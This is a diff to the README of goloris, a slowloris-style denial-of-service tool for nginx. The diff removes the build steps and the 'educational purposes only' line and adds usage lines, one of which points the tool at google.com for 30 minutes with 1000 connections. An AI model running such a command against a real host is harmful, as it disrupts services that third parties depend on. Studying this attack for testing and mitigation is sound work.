@@ -49,17 +49,11 @@ Goloris - slowloris[1] for nginx DoS
   - Patch nginx, so it drops connection if the client sends POST
     body at very slow rate.
 
+### Start with flags 
+goloris -a https:///google.com -d 30m -t 1000
 
-* **How to use it?**
 
-  ```
-  go get -u -a github.com/valyala/goloris
-  go build github.com/valyala/goloris
-  ./goloris -help
-  ```
-
-P.S. Don't forget adjusting `ulimit -n` before experimenting.
-
-And remember - goloris is published for educational purposes only.
+## Start with config
+goloris -c ./conf.yml
 
 [1] http://ha.ckers.org/slowloris/
